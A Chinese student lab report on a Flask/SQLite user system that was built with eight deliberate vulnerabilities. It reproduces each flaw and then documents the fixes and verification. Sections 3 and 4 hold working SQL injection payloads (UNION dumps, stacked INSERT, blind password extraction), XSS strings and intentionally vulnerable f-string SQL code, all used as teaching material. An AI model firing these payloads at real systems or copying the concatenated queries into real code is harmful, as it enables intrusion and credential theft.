# 用户信息管理系统 — SQL 注入漏洞实验报告

姓名：蒲思宇

学号：2024141530125

| 项目 | 内容 |
|------|------|
| 项目名称 | 用户管理系统 SQL 注入漏洞实验 |
| 框架 | Flask (Python 3) + SQLite |
| 报告日期 | 2026-07-20 |
| 版本 | v1.0（含漏洞版）→ v2.0（安全修复版） |
| 本地路径 | `/opt/Class01` |
| 启动方式 | `cd /opt/Class01 && python3 app.py` |
| 备份路径 | 漏洞版：`vulnerable_backup/` / 修复版：`app.py` |

---

## 目录

1. [项目概述](#1-项目概述)
2. [系统架构](#2-系统架构)
3. [漏洞清单（8 个）](#3-漏洞清单8-个)
4. [漏洞复现过程](#4-漏洞复现过程)
5. [修复措施](#5-修复措施)
6. [修复验证](#6-修复验证)
7. [总结与建议](#7-总结与建议)

---

## 1. 项目概述

### 1.1 项目背景

本项目在之前用户管理系统的登录功能基础上，**新增了注册和搜索功能**。初始版本在两个新功能中故意使用 `f-string` 字符串拼接构造 SQL 语句，不做任何输入过滤，制造了 8 类安全漏洞用于教学演示。

实验流程：**先构建含漏洞版本 → 复现全部 8 个漏洞 → 参数化查询修复 → 验证修复效果**。

### 1.2 预设用户

| 用户名 | 密码 | 邮箱 | 手机 |
|:-----:|:----:|:----:|:----:|
| admin | admin123 | admin@example.com | 13800138000 |
| alice | alice2025 | alice@example.com | 13900139001 |

### 1.3 初始漏洞代码

```python
# 搜索 - f-string 字符串拼接（漏洞）
query = f"SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"

# 注册 - f-string 字符串拼接（漏洞）
query = f"INSERT INTO users (username, password, email, phone) VALUES ('{username}', '{password}', '{email}', '{phone}')"

# Debug 模式开启
app.run(host="0.0.0.0", port=5000, debug=True)

# Secret Key 硬编码
app.secret_key = "dev-key-2025"
```

---

## 2. 系统架构

### 2.1 目录结构

```
Class01/
├── app.py                        # Flask 主应用
├── data/
│   └── users.db                  # SQLite 数据库
├── vulnerable_backup/            # 漏洞版备份
├── templates/
│   ├── base.html                 # 基础布局（搜索/注册 导航链接）
│   ├── login.html                # 登录页
│   ├── register.html             # ★ 新增 - 注册页面
│   ├── index.html                # 用户首页（含搜索框 + 结果表格）
│   └── admin.html                # 管理员面板
├── static/css/
│   └── style.css                 # 样式文件（未改动）
└── SQL注入漏洞实验报告-蒲思宇.md  # 本报告
```

### 2.2 技术栈

| 组件 | 技术选型 |
|------|---------|
| 框架 | Flask 3.x |
| 数据库 | SQLite 3 |
| 模板引擎 | Jinja2 |
| 密码存储 | 修复前：明文 / 修复后：scrypt 加盐哈希 |
| 部署端口 | `0.0.0.0:5000` |

### 2.3 实验流程

```
构建含漏洞版本（f-string 拼接 SQL + debug=True + 明文密码）
  → curl 复现 UNION 注入
  → curl 复现 OR 注入
  → curl 复现注册注入
  → curl 复现布尔盲注
  → 参数化查询修复
  → 密码加盐哈希
  → 统一错误提示
  → 关闭 Debug 模式
  → 8 项修复验证全部通过
```

---

## 3. 漏洞清单（8 个）

| # | 漏洞类型 | 风险等级 | 利用难度 | 影响范围 | 修复状态 |
|:-:|---------|:-------:|:--------:|---------|:-------:|
| 1 | 搜索接口 UNION 注入 | 🔴 高危 | 极低 | 脱取全库数据 | ✅ 已修复 |
| 2 | 注册接口 INSERT 注入 | 🔴 高危 | 极低 | 任意写入数据 | ✅ 已修复 |
| 3 | 密码明文存储 | 🟡 中危 | 无 | 密码直接泄露 | ✅ 已修复 |
| 4 | HTML 注释泄露凭证 | 🟡 中危 | 无 | 查看源码获取密码 | ✅ 已修复 |
| 5 | 用户枚举 | 🟢 低危 | 低 | 探测有效用户名 | ✅ 已修复 |
| 6 | 存储型 XSS | 🟡 中危 | 低 | 恶意脚本执行 | ✅ 已修复 |
| 7 | 布尔盲注 | 🔴 高危 | 低 | 逐字符提取密码 | ✅ 已修复 |
| 8 | SQL 日志泄露 | 🟢 低危 | 无 | 攻击细节泄露 | ✅ 已修复 |

### 3.1 漏洞 1：搜索接口 SQL 注入

- **位置**: `GET /search?keyword=`
- **漏洞代码**: `f"SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"`
- **危害**: 攻击者通过 UNION SELECT 拼接任意查询，可脱取 users 表全部数据（含密码明文）

### 3.2 漏洞 2：注册接口 SQL 注入

- **位置**: `POST /register`
- **漏洞代码**: `f"INSERT INTO users ... VALUES ('{username}', '{password}', ...)"`
- **危害**: 攻击者在用户名中注入 SQL，闭合 VALUES 后执行任意 INSERT 语句

### 3.3 漏洞 3：密码明文存储

- **位置**: SQLite users 表 password 字段
- **危害**: 一旦被注入脱库，所有用户密码直接明文暴露

### 3.4 漏洞 4：HTML 注释泄露默认凭证

- **位置**: `templates/login.html` 第 1 行
- **漏洞代码**: `<!-- 调试信息 - 默认管理员账号 用户名: admin 密码: admin123 -->`
- **危害**: 任何访问登录页的用户查看源码即可获取管理员密码

### 3.5 漏洞 5：用户枚举

- **位置**: `POST /register`
- **危害**: 注册时对已存在与不存在用户返回不同错误信息，可枚举有效用户名

| 尝试用户名 | 返回信息 | 结论 |
|:---------:|---------|:----:|
| admin | `注册失败: UNIQUE constraint failed` | ❌ 用户存在（泄露信息） |
| random_xyz | `注册成功，请登录` | ✅ 可注册 |

### 3.6 漏洞 6：存储型 XSS

- **位置**: 注册 → 搜索展示页面
- **危害**: 注册时在任意字段插入 `<script>`，若模板未转义则在搜索页面执行

### 3.7 漏洞 7：布尔盲注

- **位置**: `GET /search?keyword=`
- **危害**: 通过 `AND (SELECT unicode(substr(password,N,1)))=M` 逐字符爆破密码

### 3.8 漏洞 8：SQL 日志泄露

- **位置**: `app.py` 中的 `print(f"[SQL] {query}")`
- **危害**: 完整的 SQL 语句（含注入 payload）打印到控制台，被日志系统采集后泄露

---

## 4. 漏洞复现过程

### 4.1 POC 1：UNION 注入脱取全部数据

```bash
curl "http://localhost:5000/search?keyword=%27%20UNION%20SELECT%201,username,password,email,phone%20FROM%20users%20--"
```

**生成 SQL**:
```sql
SELECT * FROM users WHERE username LIKE '%' UNION SELECT 1,username,password,email,phone FROM users --%'
```

**测试结果**: 成功脱取全部用户数据

| ID | 用户名 | 密码 | 邮箱 | 手机 |
|:--:|:-----:|:----:|:----:|:----:|
| 1 | admin | admin123 | admin@example.com | 13800138000 |
| 2 | alice | alice2025 | alice@example.com | 13900139001 |

**补充测试**:
```bash
# 获取 SQLite 版本
curl "http://localhost:5000/search?keyword=%27%20UNION%20SELECT%20sqlite_version(),2,3,4,5%20--"
# 返回：3.46.1

# 获取表结构
curl "http://localhost:5000/search?keyword=%27%20UNION%20SELECT%20name,sql,3,4,5%20FROM%20sqlite_master%20WHERE%20type=%27table%27%20--"
```

### 4.2 POC 2：OR 万能条件爆所有用户

```bash
curl "http://localhost:5000/search?keyword=%27%20OR%20%271%27%3D%271"
```

**生成 SQL**:
```sql
SELECT * FROM users WHERE username LIKE '%' OR '1'='1%' OR email LIKE '%' OR '1'='1%'
```

**测试结果**: 返回数据库中全部用户（含通过注入创建的恶意用户）

### 4.3 POC 3：注册注入写入恶意数据

```bash
curl -X POST http://localhost:5000/register \
  -d "username=adminx'); INSERT INTO users (username,password,email,phone) VALUES ('hacker2','hackpwd','h@h.com','666'); --&password=any&email=any@x.com&phone=000"
```

**生成 SQL**:
```sql
INSERT INTO users (...) VALUES ('adminx'); INSERT INTO users (username,password,email,phone) VALUES ('hacker2','hackpwd','h@h.com','666'); --', 'any', 'any@x.com', '000')
```

**测试结果**: 成功创建 hacker2 用户，密码 hackpwd

### 4.4 POC 4：布尔盲注逐字符提取密码

```bash
# 探测 admin 密码第 1 个字符
curl "http://localhost:5000/search?keyword=admin%27%20AND%20(SELECT%20unicode(substr(password,1,1))%20FROM%20users%20WHERE%20username=%27admin%27)=97%20--"
# ✅ ASCII 97 = 'a' → 返回 admin 信息

# 探测 admin 密码第 2 个字符
curl "http://localhost:5000/search?keyword=admin%27%20AND%20(SELECT%20unicode(substr(password,2,1))%20FROM%20users%20WHERE%20username=%27admin%27)=100%20--"
# ✅ ASCII 100 = 'd' → 返回 admin 信息
```

**测试结果**: 通过逐字符遍历 ASCII 值（32~126），可完整还原密码 `admin123`

### 4.5 POC 5：存储型 XSS 注入

```bash
curl -X POST http://localhost:5000/register \
  -d "username=xss_test&password=<script>alert('XSS')</script>&email=<img src=x onerror=alert(1)>&phone=x"
```

**测试结果**: 恶意脚本存入数据库，搜索时 Jinja2 默认转义为 HTML 实体

### 4.6 控制台日志泄露

```
服务端输出:
[SQL] SELECT * FROM users WHERE username LIKE '%' UNION SELECT 1,username,password,email,phone FROM users --%'
```

---

## 5. 修复措施

### 5.1 参数化查询（核心修复）

| 位置 | 修复前（f-string 拼接） | 修复后（参数化查询） |
|:----:|----------------------|-------------------|
| 搜索 | `f"SELECT * FROM users WHERE username LIKE '%{keyword}%'"` | `"SELECT id, username, email, phone FROM users WHERE username LIKE ?"` |
| 注册 | `f"INSERT INTO users VALUES ('{username}', '{password}', ...)"` | `"INSERT INTO users VALUES (?, ?, ?, ?)"` |

**原理**：参数化查询将 SQL 语句与数据分离，数据库引擎将参数值视为纯数据而非代码。即使用户输入包含单引号 `'`、`OR`、`UNION`，也不会被解释为 SQL 语法。

```python
# 验证对比
keyword = "' UNION SELECT 1,'x'--"

# ❌ f-string 拼接 → 注入成功，返回 1 行
cur.execute(f"SELECT * FROM users WHERE name LIKE '%{keyword}%'")  # 返回 1

# ✅ 参数化查询 → 注入失败，返回 0 行
cur.execute("SELECT * FROM users WHERE name LIKE ?", (f"%{keyword}%",))  # 返回 0
```

### 5.2 密码加盐哈希存储

```python
from werkzeug.security import generate_password_hash, check_password_hash

# 存储：明文 → scrypt 哈希
c.execute("INSERT INTO users (...) VALUES (?, ?, ?, ?)",
          (username, generate_password_hash(password), email, phone))

# 验证：先查用户 → 再 check_password_hash
cur.execute("SELECT * FROM users WHERE username=?", (username,))
user = cur.fetchone()
if user and check_password_hash(user["password"], input_password):
    # 登录成功
```

### 5.3 搜索结果限制字段

```python
# ❌ 修复前：SELECT *（含 password）
query = f"SELECT * FROM users WHERE ..."

# ✅ 修复后：只查必要字段
cur.execute("SELECT id, username, email, phone FROM users WHERE ...")
```

### 5.4 统一错误提示

```python
# ❌ 修复前：泄露具体 SQL 错误
return render_template("register.html", error=f"注册失败: {e}")

# ✅ 修复后：统一提示
return render_template("register.html", error="注册失败，用户名可能已存在")
```

### 5.5 其他加固

| 修复项 | 修复前 | 修复后 |
|--------|--------|--------|
| Secret Key | `"dev-key-2025"` 硬编码 | `secrets.token_hex(32)` 随机生成 |
| Debug 模式 | `debug=True` | `debug=False` |
| SQL 日志 | `print(f"[SQL] {query}")` | 完全移除 |
| HTML 调试注释 | `<!-- 调试信息 - admin / admin123 -->` | 已删除 |

---

## 6. 修复验证

### 6.1 修复前后对比

| # | 测试项 | 修复前 | 修复后 |
|:-:|--------|:-----:|:-----:|
| 1 | 正常搜索 `admin` | ✅ 返回结果 | ✅ 返回结果 |
| 2 | UNION 注入 `' UNION SELECT 1,'pwn'...` | ❌ 返回伪造数据 | ✅ 无搜索结果 |
| 3 | OR 万能条件 `' OR '1'='1` | ❌ 爆出全部用户 | ✅ 无搜索结果 |
| 4 | 注册注入 `hack'),('x')--` | ❌ 成功写入恶意数据 | ✅ 特殊字符被当文本存储 |
| 5 | 密码明文泄露 | ❌ admin123 明文存储 | ✅ scrypt 加盐哈希 |
| 6 | HTML 注释泄露 | ❌ 源码可见 admin/admin123 | ✅ 已删除 |
| 7 | 用户枚举 | ❌ 区分用户是否存在 | ✅ 统一"注册失败，用户名可能已存在" |
| 8 | 布尔盲注 `AND 1=1` | ❌ 可判条件真假 | ✅ 无搜索结果（无法注入） |
| 9 | SQL 日志 | ❌ 控制台打印完整 SQL | ✅ 完全移除 |
| 10 | Debug 模式 | ❌ debug=True | ✅ debug=False |

### 6.2 验证截图式命令

```bash
# ===== 修复前漏洞验证 =====

# UNION 注入
curl "http://localhost:5000/search?keyword=%27%20UNION%20SELECT%201,%27pwn%27,%27p@x.com%27,%27999%27--"
# 修复前 → 返回 pwn    修复后 → 无搜索结果

# OR 万能条件
curl "http://localhost:5000/search?keyword=%27%20OR%20%271%27%3D%271"
# 修复前 → 返回全部用户  修复后 → 无搜索结果

# 布尔盲注
curl "http://localhost:5000/search?keyword=admin%27%20AND%201=1%20--"
# 修复前 → 返回 admin    修复后 → 无搜索结果

# 注册注入
curl -X POST http://localhost:5000/register -d "username=inject',('x'),('y--&password=x&email=x&phone=x"
# 修复前 → 注入成功      修复后 → 特殊字符被当文本

# ===== 修复后功能验证 =====

# 正常注册
curl -X POST http://localhost:5000/register -d "username=newuser&password=new123&email=n@x.com&phone=100"

# 正常搜索
curl "http://localhost:5000/search?keyword=newuser"

# 密码哈希验证
python3 -c "
from werkzeug.security import check_password_hash
import sqlite3
conn = sqlite3.connect('/opt/Class01/data/users.db')
c = conn.cursor()
c.execute(\"SELECT password FROM users WHERE username='admin'\")
print('admin/admin123:', check_password_hash(c.fetchone()[0], 'admin123'))
conn.close()
"
```

---

## 7. 总结与建议

### 7.1 修复成果

| 指标 | 修复前 | 修复后 |
|:----:|:-----:|:-----:|
| 高危漏洞 | 3 个 | **0 个** |
| 中危漏洞 | 3 个 | **0 个** |
| 低危漏洞 | 2 个 | **0 个** |
| **总计** | **8 个** | **0 个** |

### 7.2 核心经验

1. **永远不要用字符串拼接构造 SQL** — 参数化查询是防 SQL 注入的根本手段
2. **密码绝不能明文存储** — 必须加盐哈希（scrypt / bcrypt）
3. **用户输入永远不可信** — 所有输入都可能是攻击 payload
4. **统一错误提示** — 不区分"用户存在"和"用户不存在"
5. **最小信息暴露** — 不返回密码字段、不打印 SQL 日志

### 7.3 生产环境建议

- 使用 ORM（如 SQLAlchemy）从架构层面杜绝拼接风险
- 密码强度策略：最少 8 位，含大小写字母 + 数字 + 特殊字符
- 数据库账户遵循最小权限原则
- 定期使用 SQLMap 等工具进行自动化安全扫描
- 建立代码审查制度，CR 阶段拦截拼接 SQL

### 7.4 攻击路径对比

**修复前攻击路径：**
```
搜索框输入 ' UNION SELECT...  →  ✅ 获取全部用户密码明文
搜索框输入 ' OR '1'='1        →  ✅ 爆出所有用户
注册时注入关闭 VALUES          →  ✅ 写入任意数据
布尔盲注逐字符探测             →  ✅ 还原完整密码
查看页面源码                   →  ✅ 获取管理员密码
控制台日志                     →  ✅ 看到完整 SQL
```

**修复后攻击路径：**
```
搜索框输入 ' UNION SELECT...  →  ❌ 参数化查询拦截 → 无搜索结果
搜索框输入 ' OR '1'='1        →  ❌ 参数化查询拦截 → 无搜索结果
注册时注入关闭 VALUES          →  ❌ 特殊字符被当作纯文本存储
布尔盲注逐字符探测             →  ❌ 无法注入 SQL 条件
查看页面源码                   →  ❌ 无调试信息
控制台日志                     →  ❌ 日志已移除
密码 HASH 不可逆               →  ❌ scrypt 加盐，无法逆向
```

---

> **报告完毕** | 姓名：蒲思宇 | 学号：2024141530125 | 2026-07-20
